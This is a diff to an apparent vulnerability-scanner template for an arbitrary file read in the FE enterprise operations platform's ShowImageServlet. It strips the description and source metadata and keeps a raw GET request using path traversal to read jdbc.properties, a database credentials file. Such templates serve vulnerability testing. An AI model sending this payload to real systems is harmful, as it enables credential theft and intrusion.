@@ -3,12 +3,8 @@ info:
   name: 飞企互联-FE企业运营管理平台ShowImageServlet接口 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ypv0xg6x4i1eyo9x'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ypv0xg6x4i1eyo9x
-    fofa: app="飞企互联-FE企业运营管理平台"
 http:
 - raw:
   - 'GET /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print HTTP/1.1
